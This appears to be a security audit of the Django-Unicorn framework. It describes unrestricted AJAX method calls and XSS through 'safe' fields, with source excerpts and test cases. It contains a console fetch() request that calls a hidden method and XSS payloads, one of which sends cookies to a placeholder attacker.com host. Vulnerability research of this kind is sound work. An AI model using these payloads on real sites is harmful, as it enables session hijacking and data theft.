# Vulnerabilities in Django-Unicorn

## Unauthorized Method Execution

**Description:**
Django-Unicorn allows any public method on a component to be called via AJAX requests, even if the method is not explicitly exposed as an action in the component's template. This vulnerability enables attackers to execute arbitrary public methods that may not have been intended to be accessible from the client-side.

Step by step exploitation:
1. Identify a Django-Unicorn component with sensitive methods
2. Craft an AJAX request to the component's message endpoint
3. Include a `callMethod` action in the request with the sensitive method name
4. Send the request with a valid CSRF token
5. The server will execute the method without verifying if it was intended to be client-accessible

**Impact:**
High - An attacker can execute any public method defined in a component class, potentially leading to unauthorized data access, manipulation of sensitive data, or execution of sensitive operations that were not intended to be called from the client-side. This significantly expands the attack surface and may bypass business logic protections implemented in the UI.

**Vulnerability Rank:** High

**Currently Implemented Mitigations:**
The framework checks that the method exists on the component and uses Django's CSRF protection to prevent cross-site requests. Additionally, requests must have a valid checksum to be processed.

**Missing Mitigations:**
The framework doesn't validate whether a method should be callable via AJAX. A proper mitigation would be to implement an "allowlist" approach, where methods are only callable via AJAX if they're explicitly marked as such, for example through a decorator or naming convention.

**Preconditions:**
- The attacker needs to be authenticated on the site to get a valid CSRF token
- They need to know the component's name/ID and the names of methods on the component
- The methods they want to call must be public (not prefixed with underscore)

**Source Code Analysis:**
When Django-Unicorn receives an AJAX request to call a method, it processes the request without validating if the method should be callable from the client. In `django_unicorn/views/action_parsers/call_method.py`, the method execution is handled without restrictions:

```python
def _call_method_name(component: UnicornView, method_name: str, args: Tuple[Any], kwargs: Dict[str, Any]) -> Any:
    # ...
    if method_name is not None and hasattr(component, method_name):
        func = getattr(component, method_name)
        # ... argument processing ...
        if parsed_args:
            return func(*parsed_args, **parsed_kwargs)
        elif parsed_kwargs:
            return func(**parsed_kwargs)
        else:
            return func()
```

The flow is:
1. The framework extracts the method name from the request
2. It verifies the method exists using `hasattr(component, method_name)`
3. It uses `getattr(component, method_name)` to get the method
4. It calls the method without any verification that the method was meant to be exposed

Another concerning aspect is that when a method has a parameter with a Django model type hint, the framework automatically fetches the object with the provided ID using `DbModel.objects.get(pk=value)`. This could potentially allow an attacker to access database objects they shouldn't have permission to view.

**Security Test Case:**
1. Create a component with both intended public methods and sensitive methods:

```python
# sensitive_component.py
from django_unicorn.components import UnicornView

class SensitiveComponentView(UnicornView):
    access_count = 0

    def public_method(self):
        # This method is meant to be called via the UI
        return "Public method called"

    def delete_all_data(self):
        # This method performs a sensitive operation but isn't exposed in the UI
        return "All data deleted"

    def get_sensitive_data(self):
        # This method returns sensitive information but isn't exposed in the UI
        self.access_count += 1
        return "SSN: 123-45-6789, Credit Card: 4111-1111-1111-1111"
```

2. Create a template that only exposes the public method:

```html
<!-- sensitive-component.html -->
<div>
  <button unicorn:click="public_method">Call Public Method</button>
</div>
```

3. An attacker can craft a request to directly call the sensitive methods:

```javascript
// Perform this in the browser console on a page that includes the component
fetch('/unicorn/message/app.components.sensitive_component.SensitiveComponentView', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRFToken': document.querySelector('[name=csrfmiddlewaretoken]').value,
  },
  body: JSON.stringify({
    id: 'sensitive-component',
    actionQueue: [
      {
        type: 'callMethod',
        payload: {
          name: 'get_sensitive_data',
          args: []
        }
      }
    ],
    data: {},
    checksum: '...',  // Valid checksum would be needed
    epoch: Date.now()
  })
})
.then(response => response.json())
.then(data => console.log(data));
```

4. The sensitive method will execute and return the sensitive data, despite not being exposed in the UI, potentially leading to data exposure or unauthorized operations.

## Cross-Site Scripting (XSS) via Safe Fields

**Description:**
Django-Unicorn provides a mechanism to mark component fields as "safe" using the `Meta.safe` tuple, which prevents HTML encoding of those fields when rendered in templates. An attacker can exploit this feature by injecting malicious JavaScript into a field marked as "safe" if they can control the content of that field.

Step by step attack:
1. Identify a component that uses `Meta.safe = ("field_name",)` to mark a field as safe from HTML encoding
2. Find a way to set the value of this field (typically through a form input bound with `unicorn:model`)
3. Input malicious JavaScript payload like `<script>alert(document.cookie)</script>` into the form field
4. When the component re-renders, the unescaped JavaScript will execute in the victim's browser

**Impact:**
Critical - This vulnerability allows attackers to execute arbitrary JavaScript in the context of victims' browsers, potentially leading to session hijacking, credential theft, or arbitrary actions performed on behalf of the victim.

**Vulnerability Rank:** High

**Currently implemented mitigations:**
By default, all component fields are HTML escaped to prevent XSS attacks. The unsafe behavior requires explicit opt-in by developers through the `Meta.safe` attribute. The framework does include a warning in the documentation about this risk.

**Missing mitigations:**
- No runtime warnings when a field is marked as safe
- No sanitization of user input even when marked as safe
- No automatic content security policy implementation
- Insufficient warnings about the dangers of the `safe` feature with user-supplied content

**Preconditions:**
1. A component must have at least one field marked as "safe" in its Meta class
2. An attacker must be able to control the content of this field
3. The unsafe field must be rendered in the template

**Source code analysis:**
The vulnerability exists in `django_unicorn/views/__init__.py` where fields marked as "safe" are processed:

```python
# Get set of attributes that should be marked as `safe`
safe_fields = []
if hasattr(component, "Meta") and hasattr(component.Meta, "safe"):
    if isinstance(component.Meta.safe, Sequence):
        for field_name in component.Meta.safe:
            if field_name in component._attributes().keys():
                safe_fields.append(field_name)

# Mark safe attributes as such before rendering
for field_name in safe_fields:
    value = getattr(component, field_name)
    if isinstance(value, str):
        setattr(component, field_name, mark_safe(value))  # noqa: S308
```

This code explicitly marks the field content as safe using Django's `mark_safe()` function, which instructs Django's template engine not to escape the content. If an attacker can control this content, they can inject malicious JavaScript.

The XSS vulnerability is clearly demonstrated in `tests/views/test_process_component_request.py`:
```python
def test_safe_html_entities_not_encoded(client):
    data = {"hello": "test"}
    action_queue = [
        {
            "payload": {"name": "hello", "value": "<b>test1</b>"},
            "type": "syncInput",
        }
    ]
    response = post_and_get_response(
        client,
        url="/message/tests.views.test_process_component_request.FakeComponentSafe",
        data=data,
        action_queue=action_queue,
    )

    assert not response["errors"]
    assert response["data"].get("hello") == "<b>test1</b>"
    assert "<b>test1</b>" in response["dom"]
```

This test shows that when a field is marked as safe, HTML tags aren't encoded and are rendered as-is in the DOM.

**Security test case:**
1. Create a Django-Unicorn component with a field marked as "safe":
```python
class VulnerableComponent(UnicornView):
    content = "<p>Initial content</p>"

    class Meta:
        safe = ("content",)
```

2. Create a template that uses this component:
```html
<div>
    <input unicorn:model="content" type="text" id="content" />
    <div>{{ content }}</div>
</div>
```

3. As an attacker, access the page with this component
4. Enter malicious payload into the input: `<img src="x" onerror="alert(document.cookie)">`
5. Observe that the JavaScript executes and displays the cookie
6. Demonstrate that with a properly crafted payload, an attacker could exfiltrate sensitive data by using a payload like: `<img src="x" onerror="fetch('https://attacker.com/steal?cookie='+encodeURIComponent(document.cookie))">`
